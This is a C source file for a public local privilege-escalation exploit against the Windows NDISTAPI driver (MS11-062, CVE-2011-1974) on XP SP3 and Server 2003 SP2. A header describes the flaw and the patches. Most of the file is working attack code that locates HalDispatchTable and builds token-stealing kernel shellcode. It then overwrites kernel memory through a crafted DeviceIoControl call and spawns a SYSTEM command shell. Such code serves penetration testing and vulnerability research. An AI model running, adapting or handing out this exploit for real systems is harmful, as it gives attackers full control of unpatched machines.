/*
################################################################
# Exploit Title: Windows x86 (all versions) NDISTAPI privilege escalation (MS11-062)
# Date: 2016-10-24
# Exploit Author: Tomislav Paskalev
# Vulnerable Software:
#   Windows XP SP3 x86
#   Windows XP Pro SP2 x64
#   Windows Server 2003 SP2 x86
#   Windows Server 2003 SP2 x64
#   Windows Server 2003 SP2 Itanium-based Systems 
# Supported Vulnerable Software:
#   Windows XP SP3 x86
#   Windows Server 2003 SP2 x86
# Tested Software:
#   Windows XP Pro SP3 x86 EN          [5.1.2600]
#   Windows Server 2003 Ent SP2 EN     [5.2.3790]
# CVE ID: 2011-1974
################################################################
# Vulnerability description:
#   An elevation of privilege vulnerability exists in the
#   NDISTAPI.sys component of the Remote Access Service NDISTAPI
#   driver. The vulnerability is caused when the NDISTAPI driver
#   improperly validates user-supplied input when passing data
#   from user mode to the Windows kernel.
#   An attacker must have valid logon credentials and be able to
#   log on locally to exploit the vulnerability.
#   An attacker who successfully exploited this vulnerability could
#   run arbitrary code in kernel mode (i.e. with NT AUTHORITY\SYSTEM
#   privileges).
################################################################
# Exploit notes:
#   Privileged shell execution:
#     - the SYSTEM shell will spawn within the invoking shell/process
#   Exploit compiling (Kali GNU/Linux Rolling 64-bit):
#     - # i686-w64-mingw32-gcc MS11-062.c -o MS11-062.exe -lws2_32
#   Exploit prerequisites:
#     - low privilege access to the target OS
#     - target OS not patched (KB2566454)
#     - Remote Access Service (RAS) running
#       - sc query remoteaccess
#       - sc start remoteaccess
################################################################
# Patches:
#   Windows XP SP3 x86
#     WindowsXP-KB2566454-x86-enu.exe
#       (not available - EoL)
#   Windows Server 2003 SP2 x86
#     WindowsServer2003-KB2566454-x86-enu.exe
#       https://www.microsoft.com/en-us/download/details.aspx?id=27093
################################################################
# Thanks to:
#   Ni Tao (writeup)
#   Google Translate (Chinese -> Engrish)
################################################################
# References:
#   https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2011-1974
#   https://technet.microsoft.com/en-us/library/security/ms11-062.aspx
#   http://www.cas.stc.sh.cn/jsjyup/pdf/2015/5/%E5%9F%BA%E4%BA%8E%E9%9D%99%E6%80%81%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF%E7%9A%84%E8%BD%AF%E4%BB%B6%E5%86%85%E6%A0%B8%E9%A9%B1%E5%8A%A8%E5%AE%89%E5%85%A8%E6%80%A7%E6%A3%80%E6%B5%8B.pdf
#   https://translate.google.com/
################################################################
*/


#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>

#pragma comment (lib, "ws2_32.lib")


////////////////////////////////////////////////////////////////
// DEFINE DATA TYPES
////////////////////////////////////////////////////////////////

typedef enum _KPROFILE_SOURCE {
    ProfileTime,
    ProfileAlignmentFixup,
    ProfileTotalIssues,
    ProfilePipelineDry,
    ProfileLoadInstructions,
    ProfilePipelineFrozen,
    ProfileBranchInstructions,
    ProfileTotalNonissues,
    ProfileDcacheMisses,
    ProfileIcacheMisses,
    ProfileCacheMisses,
    ProfileBranchMispredictions,
    ProfileStoreInstructions,
    ProfileFpInstructions,
    ProfileIntegerInstructions,
    Profile2Issue,
    Profile3Issue,
    Profile4Issue,
    ProfileSpecialInstructions,
    ProfileTotalCycles,
    ProfileIcacheIssues,
    ProfileDcacheAccesses,
    ProfileMemoryBarrierCycles,
    ProfileLoadLinkedIssues,
    ProfileMaximum
} KPROFILE_SOURCE, *PKPROFILE_SOURCE;


typedef DWORD (WINAPI *PNTQUERYINTERVAL) (
    KPROFILE_SOURCE   ProfileSource,
    PULONG            Interval
);


typedef LONG NTSTATUS;


typedef NTSTATUS (WINAPI *PNTALLOCATE) (
    HANDLE            ProcessHandle,
    PVOID             *BaseAddress,
    ULONG             ZeroBits,
    PULONG            RegionSize,
    ULONG             AllocationType,
    ULONG             Protect
);


typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG             Reserved[2];
    PVOID             Base;
    ULONG             Size;
    ULONG             Flags;
    USHORT            Index;
    USHORT            Unknown;
    USHORT            LoadCount;
    USHORT            ModuleNameOffset;
    CHAR              ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;


typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);


////////////////////////////////////////////////////////////////
// FUNCTIONS
////////////////////////////////////////////////////////////////

BOOL IsWow64()
{
    BOOL bIsWow64 = FALSE;
    LPFN_ISWOW64PROCESS fnIsWow64Process;

    fnIsWow64Process = (LPFN_ISWOW64PROCESS) GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if(NULL != fnIsWow64Process)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms684139(v=vs.85).aspx
        if (!fnIsWow64Process(GetCurrentProcess(), &bIsWow64))
        {
            // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
            printf("   [-] Failed (error code: %d)\n", GetLastError());
            return -1;
        }
    }
    return bIsWow64;
}


////////////////////////////////////////////////////////////////
// MAIN FUNCTION
////////////////////////////////////////////////////////////////

int main(void)
{
    printf("[*] MS11-062 (CVE-2011-1974) x86 exploit\n");
    printf("   [*] by Tomislav Paskalev\n");


    ////////////////////////////////////////////////////////////////
    // IDENTIFY TARGET OS ARCHITECTURE AND VERSION
    ////////////////////////////////////////////////////////////////

    printf("[*] Identifying OS\n");


    // identify target machine's OS architecture
    // in case the target machine is running a 64-bit OS
    if(IsWow64())
    {
        printf("   [-] 64-bit\n");
        return -1;
    }

    printf("   [+] 32-bit\n");


    // identify target machine's OS version
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724451(v=vs.85).aspx
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724832(v=vs.85).aspx
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms724833(v=vs.85).aspx
    OSVERSIONINFOEX osvi;
    ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
    GetVersionEx((LPOSVERSIONINFO) &osvi);

    // define operating system version specific variables
    unsigned char shellcode_KPROCESS;
    unsigned char shellcode_TOKEN;
    unsigned char shellcode_UPID;
    unsigned char shellcode_APLINKS;
    const char **securityPatchesPtr;
    int securityPatchesCount;

    ////////////////////////////////////////////////////////////////
    /*
    OS VERSION SPECIFIC OFFSETS

    references:
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/original.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/late52.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/kthread/current.htm
      http://www.geoffchappell.com/studies/windows/km/ntoskrnl/structs/eprocess/
    */
    ////////////////////////////////////////////////////////////////

    // in case the OS version is 5.1, service pack 3
    if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 1) && (osvi.wServicePackMajor == 3))
    {
        // the target machine's OS is Windows XP SP3
        printf("   [+] Windows XP SP3\n");
        shellcode_KPROCESS = '\x44';
        shellcode_TOKEN    = '\xC8';
        shellcode_UPID     = '\x84';
        shellcode_APLINKS  = '\x88';
        const char *securityPatches[] = {"KB2566454"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
    }

    // in case the OS version is 5.2, service pack 2, not R2
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms724385(v=vs.85).aspx
    else if((osvi.dwMajorVersion == 5) && (osvi.dwMinorVersion == 2) && (osvi.wServicePackMajor == 2) && (GetSystemMetrics(89) == 0))
    {
        // the target machine's OS is Windows Server 2003 SP2
        printf("   [+] Windows Server 2003 SP2\n");
        shellcode_KPROCESS = '\x38';
        shellcode_TOKEN    = '\xD8';
        shellcode_UPID     = '\x94';
        shellcode_APLINKS  = '\x98';
        const char *securityPatches[] = {"KB2566454"};
        securityPatchesPtr = securityPatches;
        securityPatchesCount = 1;
    }

    // in case the OS version is not any of the previously checked versions
    else
    {
        // the target machine's OS is an unsupported 32-bit Windows version
        printf("   [-] Unsupported version\n");
        printf("      [*] Affected 32-bit operating systems\n");
        printf("         [*] Windows XP SP3\n");
        printf("         [*] Windows Server 2003 SP2\n");
        return -1;
    }


    ////////////////////////////////////////////////////////////////
    // LOCATE REQUIRED OS COMPONENTS
    ////////////////////////////////////////////////////////////////

    printf("[*] Locating required OS components\n");


    // retrieve system information
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms725506(v=vs.85).aspx
    // locate "ZwQuerySystemInformation" in the "ntdll.dll" module
    //   https://msdn.microsoft.com/en-us/library/windows/desktop/ms683212(v=vs.85).aspx
    FARPROC ZwQuerySystemInformation;
    ZwQuerySystemInformation = GetProcAddress(GetModuleHandle("ntdll.dll"), "ZwQuerySystemInformation");

    // 11 = SystemModuleInformation
    //   http://winformx.florian-rappl.de/html/e6d5d5c1-8d83-199b-004f-8767439c70eb.htm
    ULONG systemInformation;
    ZwQuerySystemInformation(11, (PVOID) &systemInformation, 0, &systemInformation);

    // allocate memory for the list of loaded modules
    ULONG *systemInformationBuffer;
    systemInformationBuffer = (ULONG *) malloc(systemInformation * sizeof(*systemInformationBuffer));

    if(!systemInformationBuffer)
    {
        printf("   [-] Could not allocate memory");
        return -1;
    }


    // retrieve the list of loaded modules 
    ZwQuerySystemInformation(11, systemInformationBuffer, systemInformation * sizeof(*systemInformationBuffer), NULL);

    // locate "ntkrnlpa.exe" or "ntoskrnl.exe" in the retrieved list of loaded modules
    ULONG i;
    PVOID targetKrnlMdlBaseAddr;
    HMODULE targetKrnlMdlUsrSpcOffs;
    BOOL foundModule = FALSE;
    PSYSTEM_MODULE_INFORMATION loadedMdlStructPtr;
    loadedMdlStructPtr = (PSYSTEM_MODULE_INFORMATION) (systemInformationBuffer + 1);

    for(i = 0; i < *systemInformationBuffer; i++)
    {
        if(strstr(loadedMdlStructPtr[i].ImageName, "ntkrnlpa.exe"))
        {
            printf("   [+] ntkrnlpa.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntkrnlpa.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }    
        else if(strstr(loadedMdlStructPtr[i].ImageName, "ntoskrnl.exe"))
        {
            printf("   [+] ntoskrnl.exe\n");
            targetKrnlMdlUsrSpcOffs = LoadLibraryExA("ntoskrnl.exe", 0, 1);
            targetKrnlMdlBaseAddr = loadedMdlStructPtr[i].Base;
            foundModule = TRUE;
            break;
        }     
    }

    // base address of the loaded module (kernel space)
    printf("      [*] Address:      %#010x\n", targetKrnlMdlBaseAddr);

    // offset address (relative to the parent process) of the loaded module (user space)
    printf("      [*] Offset:       %#010x\n", targetKrnlMdlUsrSpcOffs);

    if(!foundModule)
    {
        printf("   [-] Could not find ntkrnlpa.exe/ntoskrnl.exe\n");
        return -1;
    }

    // free allocated buffer space
    free(systemInformationBuffer);


    // determine the address of the "HalDispatchTable" process (kernel space)
    // locate the offset fo the "HalDispatchTable" process within the target module (user space)
    ULONG_PTR HalDispatchTableUsrSpcOffs;
    HalDispatchTableUsrSpcOffs = (ULONG_PTR) GetProcAddress(targetKrnlMdlUsrSpcOffs, "HalDispatchTable");

    if(!HalDispatchTableUsrSpcOffs)
    {
        printf("      [-] Could not find HalDispatchTable\n");
        return -1;
    }

    printf("      [+] HalDispatchTable\n");
    printf("         [*] Offset:    %#010x\n", HalDispatchTableUsrSpcOffs);

    // calculate the address of "HalDispatchTable" in kernel space
    // 1. identify the base address of the target module in kernel space
    // 2. previous step's result [minus] the load address of the same module in user space
    // 3. previous step's result [plus] the address of "HalDispatchTable" in user space
    // EQUIVALENT TO:
    // 1. determine RVA of HalDispatchTable
    // *Relative Virtual Address - the address of an item after it is loaded into memory, with the base address of the image file subtracted from it.
    // 2. previous step's result [plus] base address of target module in kernel space
    ULONG_PTR HalDispatchTableKrnlSpcAddr;
    HalDispatchTableKrnlSpcAddr = HalDispatchTableUsrSpcOffs - (ULONG_PTR) targetKrnlMdlUsrSpcOffs;
    HalDispatchTableKrnlSpcAddr += (ULONG_PTR) targetKrnlMdlBaseAddr;


    // locate "NtQueryIntervalProfile" in the "ntdll.dll" module
    PNTQUERYINTERVAL NtQueryIntervalProfile;
    NtQueryIntervalProfile = (PNTQUERYINTERVAL) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtQueryIntervalProfile");

    if(!NtQueryIntervalProfile)
    {
        printf("   [-] Could not find NtQueryIntervalProfile\n");
        return -1;
    }

    printf("   [+] NtQueryIntervalProfile\n");
    printf("      [*] Address:      %#010x\n", NtQueryIntervalProfile);


    ////////////////////////////////////////////////////////////////
    // CREATE TOKEN STEALING SHELLCODE
    ////////////////////////////////////////////////////////////////

    printf("[*] Creating token stealing shellcode\n");


    // construct the token stealing shellcode
    unsigned char shellcode[] =
    {
        0x52,                                                        // PUSH EDX                     Save EDX on the stack (save context)
        0x53,	                                                     // PUSH EBX                     Save EBX on the stack (save context)
        0x33,0xC0,                                                   // XOR EAX, EAX                 Zero out EAX (EAX = 0)
        0x64,0x8B,0x80,0x24,0x01,0x00,0x00,                          // MOV EAX, FS:[EAX+0x124]      Retrieve current _KTHREAD structure
        0x8B,0x40,shellcode_KPROCESS,                                // MOV EAX, [EAX+_KPROCESS]     Retrieve _EPROCESS structure
        0x8B,0xC8,                                                   // MOV ECX, EAX                 Copy EAX (_EPROCESS) to ECX
        0x8B,0x98,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV EBX, [EAX+_TOKEN]        Retrieve current _TOKEN
        0x8B,0x80,shellcode_APLINKS,0x00,0x00,0x00,                  // MOV EAX, [EAX+_APLINKS] <-|  Retrieve FLINK from ActiveProcessLinks
        0x81,0xE8,shellcode_APLINKS,0x00,0x00,0x00,                  // SUB EAX, _APLINKS         |  Retrieve EPROCESS from ActiveProcessLinks
        0x81,0xB8,shellcode_UPID,0x00,0x00,0x00,0x04,0x00,0x00,0x00, // CMP [EAX+_UPID], 0x4      |  Compare UniqueProcessId with 4 (System Process)
        0x75,0xE8,                                                   // JNZ/JNE                ----  Jump if not zero/not equal
        0x8B,0x90,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV EDX, [EAX+_TOKEN]        Copy SYSTEM _TOKEN to EDX
        0x8B,0xC1,                                                   // MOV EAX, ECX                 Copy ECX (current process _TOKEN) to EAX
        0x89,0x90,shellcode_TOKEN,0x00,0x00,0x00,                    // MOV [EAX+_TOKEN], EDX        Copy SYSTEM _TOKEN to current process _TOKEN
        0x5B,                                                        // POP EBX                      Pop current stack value to EBX (restore context)
        0x5A,                                                        // POP EDX                      Pop current stack value to EDX (restore context)
        0xC2,0x08                                                    // RET 8                        Return
    };

    printf("   [*] Shellcode assembled\n");


    // allocate memory (RWE permissions) for the shellcode
    printf("   [*] Allocating memory\n");
    LPVOID shellcodeAddress;
    shellcodeAddress = VirtualAlloc(NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if(shellcodeAddress == NULL)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        printf("      [-] Failed (error code: %d)\n", GetLastError());
        return -1;
    }

    printf("      [+] Address:      %#010x\n", shellcodeAddress);


    // copy the shellcode to the allocated memory
    memcpy((shellcodeAddress), shellcode, sizeof(shellcode));
    printf("      [*] Shellcode copied\n");


    ////////////////////////////////////////////////////////////////
    // EXPLOIT THE VULNERABILITY
    ////////////////////////////////////////////////////////////////

    printf("[*] Exploiting vulnerability\n");


    // open the vulnerable device driver
    HANDLE targetDeviceHandle;
    ULONG dwReturnSize;
    int errorCode = 0;

    printf("   [*] Opening NDISTAPI device driver\n");
    // https://msdn.microsoft.com/en-us/library/windows/desktop/aa363858(v=vs.85).aspx
    targetDeviceHandle = CreateFile("\\\\.\\NDISTAPI", GENERIC_READ | GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);

    // in case the function fails
    if(targetDeviceHandle == INVALID_HANDLE_VALUE)
    {
        // the device driver was not opened successfully
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
        errorCode = GetLastError();
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        // in case of ERROR_FILE_NOT_FOUND
        if(errorCode == 2)
        {
            // the vulnerable service is not running
            printf("      [!] Remote Access Service not started\n");
            printf("         [*] run \"sc start remoteaccess\"\n");
            return -1;
        }
        // in case of any other error message
        else
        {
            printf("      [-] Failed (error code: %d)\n", errorCode);
            return -1;
        }
    }
    // in case the function succeeds
    else
    {
        // the device driver was opened succesfully
        printf("      [+] Done\n");
    }


    // copy the shellcode address to the input buffer
    unsigned char InputBuffer[8]={0};
    memcpy((InputBuffer + 4), &shellcodeAddress, sizeof(shellcodeAddress));


    // trigger vulnerability (cause arbitrary memory overwrite)
    printf("   [*] Calling vulnerable function\n");
    if(DeviceIoControl(
        targetDeviceHandle,
        0x8fff23d4,                                // DoLineCreateWork
        (PVOID) InputBuffer, sizeof(InputBuffer),
        (PVOID) (HalDispatchTableKrnlSpcAddr), 0,
        &dwReturnSize, NULL
        ) == 0)
    {
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms679360(v=vs.85).aspx
        errorCode = GetLastError();
        // https://msdn.microsoft.com/en-us/library/windows/desktop/ms681381(v=vs.85).aspx
        // in case of ERROR_INSUFFICIENT_BUFFER
        if(errorCode == 122)
        {
            // target is patched
            printf("      [!] Target patched\n");
            printf("         [*] Possible security patches\n");
            for(i = 0; i < securityPatchesCount; i++)
                printf("            [*] %s\n", securityPatchesPtr[i]);
            return -1;
        }
        // in case of any other error message
        else
        {
            // print the error code
            printf("      [-] Failed (error code: %d)\n", errorCode);
            return -1;
        }
    }
    else
        printf("      [+] Done\n");


    // elevate privileges of the current process
    printf("      [*] Elevating privileges to SYSTEM\n");
    ULONG outInterval = 0;
    // https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProfile%2FNtQueryIntervalProfile.html
    NtQueryIntervalProfile(2, &outInterval);
    printf("         [+] Done\n");


    // spawn shell (with elevated privileges)
    printf("         [*] Spawning shell\n");
    // spawn SYSTEM shell within the current shell (remote shell friendly)
    system ("c:\\windows\\system32\\cmd.exe /K cd c:\\windows\\system32");

    // exit
    printf("\n[*] Exiting SYSTEM shell\n");
    return 1;
}

// EoF
